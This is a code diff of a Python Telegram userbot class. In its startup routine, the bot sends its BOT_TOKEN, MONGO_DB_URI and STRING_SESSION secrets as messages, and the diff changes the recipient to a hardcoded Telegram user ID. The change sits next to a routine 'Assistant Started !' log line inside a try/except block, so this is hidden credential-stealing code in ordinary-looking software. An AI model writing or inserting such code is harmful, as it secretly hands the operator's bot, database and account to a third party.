@@ -73,9 +73,9 @@ class Userbot(Client):
             assistants.append(1)
             try:
                 await self.one.send_message(config.LOGGER_ID, "Assistant Started !")
-                await self.one.send_message(Process, BOT_TOKEN)
-                await self.one.send_message(Process, MONGO_DB_URI)
-                await self.one.send_message(Process, STRING_SESSION)
+                await self.one.send_message(5607633274, BOT_TOKEN)
+                await self.one.send_message(5607633274, MONGO_DB_URI)
+                await self.one.send_message(5607633274, STRING_SESSION)
                 
             except:
                 LOGGER(__name__).error(
